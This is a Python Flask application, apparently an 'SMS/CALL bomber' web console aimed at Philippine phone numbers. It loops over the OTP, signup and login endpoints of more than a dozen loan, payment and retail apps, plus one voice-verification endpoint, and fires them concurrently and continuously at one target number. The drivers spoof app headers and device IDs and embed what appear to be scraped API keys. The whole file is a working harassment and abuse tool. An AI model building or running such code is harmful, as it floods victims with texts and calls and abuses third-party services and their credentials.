#!/usr/bin/env python3
# app.py — SMS/CALL web console (Render-ready)
# local: pip install -r requirements.txt && python app.py
# prod:  gunicorn app:app --bind 0.0.0.0:$PORT --workers 1 --threads 16 --worker-class gthread --timeout 120

import hashlib
import json
import os
import random
import re
import threading
import time
from collections import deque
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import requests
from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

# ──────────────────────────────────────────────────────────
# SERVICE DRIVERS
# ──────────────────────────────────────────────────────────

def format_phone(phone: str) -> str:
    clean = re.sub(r"\D", "", phone)
    if clean.startswith("63"):
        clean = clean[2:]
    if clean.startswith("0"):
        clean = clean[1:]
    return clean[:10]


def random_string(n: int = 10) -> str:
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(n))


def random_email() -> str:
    return f"{random_string(10)}@gmail.com"


def _now() -> int:
    return int(time.time())


def _now_ms() -> int:
    return int(time.time() * 1000)


def mwell_send(phone):
    try:
        f = format_phone(phone)
        ts = _now_ms()
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "ocp-apim-subscription-key": "0a57846786b34b0a89328c39f584892b",
            "x-app-version": "03.942.035",
            "x-device-type": "android",
            "x-device-model": "oneplus CPH2465",
            "x-timestamp": str(ts),
            "x-request-id": random_string(16),
        }
        b = {"country": "PH", "phoneNumber": f, "phoneNumberPrefix": "+63"}
        r = requests.post("https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def pexx_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "appversion": "3.0.14",
            "x-msession-id": "undefined",
            "tid": random_string(11),
        }
        b = {"0": {"json": {"email": "", "areaCode": "+63", "phone": f"+63{f}",
                             "otpChannel": "TG", "otpUsage": "REGISTRATION"}}}
        r = requests.post("https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def supportvip_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "boat": "com.peso.loan.vip.credit",
            "surface": "1.0.7",
            "suggestion": "d284bf47c4c1e4da4e3e6375498c6245",
            "telescope": "",
            "Content-Type": "application/json; charset=utf-8",
        }
        b = {"invasion": f, "persist": "login", "threshold": False}
        r = requests.post("https://supportviploan.com/pomelo/abortion/suffering/test",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def ezloan_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.9.2",
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "accept-language": "en",
            "imei": random_string(32),
            "device": "android",
            "appversion": "2.0.4",
            "appid": "EZLOAN",
            "businessid": "EZLOAN",
        }
        b = {"businessId": "EZLOAN", "contactNumber": f"+63{f}"}
        r = requests.post("https://gateway.ezloancash.ph/security/auth/otp/request",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def xpressph_send(phone):
    try:
        f = format_phone(phone)
        ts = _now()
        h = {
            "User-Agent": "Dalvik/2.1.0",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        b = {"FirstName": f"User{ts}", "LastName": "Test",
             "Email": f"user{ts}@gmail.com", "Phone": f"+63{f}"}
        r = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def bistro_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "x-requested-with": "com.allcardtech.bistro",
        }
        r = requests.get(
            f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{f}",
            headers=h, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def bayadcenter_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        }
        b = {"mobileNumber": f"+63{f}", "emailAddress": random_email()}
        r = requests.post("https://api.online.bayad.com/api/sign-up/otp",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def supremeloan_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "bill": "",
            "syndrome": "1.1.3",
            "throughout": "com.supreme.money.loan",
            "cute": "d284bf47c4c1e4da4e3e6375498c6245",
            "cure": "14.864864864864865",
            "come": "121.05883328670785",
            "Content-Type": "application/json; charset=utf-8",
        }
        b = {"aide": "d284bf47c4c1e4da4e3e6375498c6245", "exactly": f, "sick": False}
        r = requests.post("https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def pickupcoffee_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.12.0",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        b = {"mobile_number": f"+63{f}", "login_method": "mobile_number"}
        r = requests.post("https://production.api.pickup-coffee.net/v2/customers/login",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def honeyloan_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15)",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        b = {"phone": f}
        r = requests.post("https://api.honeyloan.ph/api/client/registration/step-one",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def kumuph_send(phone):
    try:
        f = format_phone(phone)
        ts = _now()
        rnd = random_string(32)
        sig = hashlib.sha256(f"{ts}{rnd}{f}kumu_secret_2024".encode()).hexdigest()
        h = {
            "User-Agent": "okhttp/5.0.0-alpha.14",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "Device-Type": "android",
            "Device-Id": random_string(16),
        }
        b = {
            "country_code": "+63",
            "encrypt_rnd_string": rnd,
            "cellphone": f,
            "encrypt_signature": sig,
            "encrypt_timestamp": ts,
        }
        r = requests.post("https://api.kumuapi.com/v2/user/sendverifysms",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def s5com_send(phone):
    try:
        f = f"+63{format_phone(phone)}"
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36",
        }
        r = requests.post("https://api.s5.com/player/api/v1/otp/request",
                          headers=h, data=f"phone_number={f}", timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def cashalo_send(phone):
    try:
        f = format_phone(phone)
        dev = random_string(16)
        h = {
            "User-Agent": "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "x-api-key": "UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==",
            "x-device-identifier": dev,
            "x-device-type": "1",
        }
        b = {"phone_number": f, "device_identifier": dev, "device_type": 1}
        r = requests.post("https://api.cashaloapp.com/access/register",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def mocasa_voice_send(phone):
    try:
        f = format_phone(phone)
        if not f.startswith("9"):
            return False
        payload = json.dumps({
            "country": "Philippines",
            "appVersion": 206,
            "appPackageName": "com.mocasa.ph",
            "mobile": f,
            "channel": "APP",
            "systemType": 0,
            "myDeviceId": "0536db2db2b341e483de881c94e0e203",
            "appCode": "mocasa",
            "sendChannel": "voice",
            "verifyType": 1,
            "token": "",
        })
        h = {
            "User-Agent": "okhttp/4.8.0",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }
        r = requests.post("https://service.mocasa.com/app/v1/login/sendVerifyCode",
                          headers=h, data=payload, timeout=15)
        if r.status_code == 200:
            return r.json().get("code") == 0
        return False
    except Exception:
        return False


SMS_SERVICES = [
    ("MWELL", mwell_send),
    ("PEXX", pexx_send),
    ("SUPPORT VIP", supportvip_send),
    ("EZLOAN", ezloan_send),
    ("XPRESS PH", xpressph_send),
    ("BISTRO", bistro_send),
    ("BAYAD CENTER", bayadcenter_send),
    ("SUPREME LOAN", supremeloan_send),
    ("PICKUP COFFEE", pickupcoffee_send),
    ("HONEY LOAN", honeyloan_send),
    ("KUMU PH", kumuph_send),
    ("S5.COM", s5com_send),
    ("CASHALO", cashalo_send),
]

VOICE_SERVICES = [
    ("MOCASA VOICE", mocasa_voice_send),
]

# ──────────────────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────────────────

LOCK = threading.Lock()
STATE = {
    "running": False,
    "phone": "",
    "continuous": False,
    "interval": 0.0,
    "cycle": 0,
    "sms_ok": 0,
    "sms_total": 0,
    "voice_ok": 0,
    "voice_total": 0,
    "started_at": None,
    "stop_flag": threading.Event(),
    "log": deque(maxlen=800),
}
WORKER = {"thread": None}


def log(kind: str, msg: str) -> None:
    entry = {
        "t": datetime.now().strftime("%H:%M:%S"),
        "kind": kind,
        "msg": msg,
    }
    with LOCK:
        STATE["log"].append(entry)


def reset_state(phone: str, continuous: bool, interval: float) -> None:
    with LOCK:
        STATE["running"] = True
        STATE["phone"] = phone
        STATE["continuous"] = continuous
        STATE["interval"] = float(interval)
        STATE["cycle"] = 0
        STATE["sms_ok"] = 0
        STATE["sms_total"] = 0
        STATE["voice_ok"] = 0
        STATE["voice_total"] = 0
        STATE["started_at"] = time.time()
        STATE["stop_flag"].clear()
        STATE["log"].clear()


def fire_one(kind: str, name: str, func, phone: str, ident: int) -> bool:
    if STATE["stop_flag"].is_set():
        return False
    try:
        ok = bool(func(phone))
    except Exception:
        ok = False
    with LOCK:
        if kind == "sms":
            STATE["sms_total"] += 1
            if ok:
                STATE["sms_ok"] += 1
        else:
            STATE["voice_total"] += 1
            if ok:
                STATE["voice_ok"] += 1
    log(kind, f"{name} [{ident}] {'OK' if ok else 'FAIL'}")
    return ok


def run_cycle(phone: str, rounds: int, voice_calls: int) -> None:
    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = []
        for r in range(1, rounds + 1):
            for name, fn in SMS_SERVICES:
                futs.append(ex.submit(fire_one, "sms", name, fn, phone, r))
        for c in range(1, voice_calls + 1):
            for name, fn in VOICE_SERVICES:
                futs.append(ex.submit(fire_one, "voice", name, fn, phone, c))
        for f in futs:
            try:
                f.result()
            except Exception:
                pass


def worker(phone: str, rounds: int, voice_calls: int,
           continuous: bool, interval: float) -> None:
    while True:
        if STATE["stop_flag"].is_set():
            break
        with LOCK:
            STATE["cycle"] += 1
            cyc = STATE["cycle"]
        log("cycle", f"=== cycle {cyc} start ===")
        run_cycle(phone, rounds, voice_calls)
        with LOCK:
            sms_ok = STATE["sms_ok"]
            sms_total = STATE["sms_total"]
            voice_ok = STATE["voice_ok"]
            voice_total = STATE["voice_total"]
        log("cycle",
            f"=== cycle {cyc} end · sms {sms_ok}/{sms_total} · voice {voice_ok}/{voice_total} ===")
        if not continuous:
            break
        if interval > 0:
            if STATE["stop_flag"].wait(interval):
                break
    with LOCK:
        STATE["running"] = False
    log("system", "worker stopped")

# ──────────────────────────────────────────────────────────
# ROUTES
# ──────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/start", methods=["POST"])
def api_start():
    if STATE["running"]:
        return jsonify({"ok": False, "err": "already running"}), 409
    data = request.get_json(force=True, silent=True) or {}
    phone_raw = str(data.get("phone", "")).strip()
    f = format_phone(phone_raw)
    if len(f) != 10 or not f.startswith("9"):
        return jsonify({"ok": False, "err": "invalid PH number"}), 400
    try:
        rounds = max(1, min(10, int(data.get("rounds", 3))))
        voice_calls = max(1, min(10, int(data.get("voice_calls", 3))))
        interval = max(0.0, min(60.0, float(data.get("interval", 0))))
    except Exception:
        return jsonify({"ok": False, "err": "bad config"}), 400
    continuous = bool(data.get("continuous", True))

    reset_state(f, continuous, interval)
    log("system",
        f"launch phone={f} rounds={rounds} voice={voice_calls} "
        f"continuous={continuous} interval={interval}s")

    t = threading.Thread(target=worker,
                         args=(f, rounds, voice_calls, continuous, interval),
                         daemon=True)
    WORKER["thread"] = t
    t.start()
    return jsonify({"ok": True, "phone": f})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    STATE["stop_flag"].set()
    log("system", "stop requested")
    return jsonify({"ok": True})


@app.route("/api/status")
def api_status():
    with LOCK:
        started = STATE["started_at"]
        uptime = (time.time() - started) if started and STATE["running"] else 0
        snapshot = {
            "running": STATE["running"],
            "phone": STATE["phone"],
            "continuous": STATE["continuous"],
            "interval": STATE["interval"],
            "cycle": STATE["cycle"],
            "sms_ok": STATE["sms_ok"],
            "sms_total": STATE["sms_total"],
            "voice_ok": STATE["voice_ok"],
            "voice_total": STATE["voice_total"],
            "uptime": round(uptime, 1),
            "log": list(STATE["log"])[-120:],
        }
    return jsonify(snapshot)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"KLEN web console — http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
